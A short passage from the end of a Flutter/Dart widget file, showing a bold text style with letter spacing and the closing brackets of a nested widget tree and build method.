                    fontWeight: FontWeight.w700,
                    letterSpacing: 1.2,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}